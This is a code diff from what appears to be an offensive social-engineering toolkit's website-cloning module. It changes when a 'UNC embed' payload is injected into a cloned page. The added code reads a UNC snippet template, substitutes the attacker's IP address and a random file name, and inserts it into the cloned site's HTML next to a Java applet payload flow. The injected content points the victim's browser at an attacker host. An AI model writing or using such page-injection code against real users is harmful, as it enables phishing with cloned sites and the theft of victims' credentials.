@@ -197,6 +197,26 @@ try:
 
     if site_cloned == True:
 
+	# if we specify UNC embedding
+	if unc_embed == True:
+	        fileopen=file("src/program_junk/web_clone/index.html","r")
+		index_database = fileopen.read()
+		filewrite = file("src/program_junk/web_clone/index.html", "w")
+	
+	        ## Open the UNC EMBED
+	        fileopen4=file("src/webattack/web_clone/unc.database", "r")
+		unc_database = fileopen4.read()
+        	unc_database = unc_database.replace("IPREPLACEHERE", ipaddr)
+                unc_database = unc_database.replace("RANDOMNAME", rand_gen_win)
+        	match = re.search("</body.*?>", index_database)
+                if match:
+                	index_database = re.sub("</body.*?>", unc_database + "\n</body>", index_database)
+                if not match:
+                	index_database = re.sub("<head.*?>", "\n<head>" + unc_database, index_database)
+
+		filewrite.write(index_database)
+		filewrite.close()
+
         ## java applet attack vector
 
         ## check for java flag for multi attack
@@ -221,8 +241,6 @@ try:
                 ## Write to new file with java applet added
                 filewrite=file("src/program_junk/web_clone/index.html.new", "w")
                 fileopen3=file("src/webattack/web_clone/repeater.database", "r")
-                ## Open the UNC EMBED
-                fileopen4=file("src/webattack/web_clone/unc.database", "r")
 
                 ## this is our cloned website 
                 index_database = fileopen.read()
@@ -230,8 +248,6 @@ try:
                 applet_database = fileopen2.read()
                 ## this is our repeater database
                 repeater_database = fileopen3.read()
-                ## this is our unc database
-                unc_database = fileopen4.read()
 
                 ## here we begin replacing specifics in order to prep java applet payload
                 applet_database = applet_database.replace("msf.exe", rand_gen_win)
@@ -269,13 +285,6 @@ try:
                                 index_database = re.sub("<applet ", repeater_database + "\n<applet ", index_database)
                         if not match:
                                 index_database = re.sub("<head.*?>", "\n<head>" + repeater_database, index_database)
-
-                if unc_embed == True:
-                        match = re.search("</body.*?>", index_database)
-                        if match:
-                                index_database = re.sub("</body.*?>", unc_database + "\n</body>", index_database)
-                        if not match:
-                                index_database = re.sub("<head.*?>", "\n<head>" + unc_database, index_database)
 
                 counter = 0
                 ## confirm we can find body
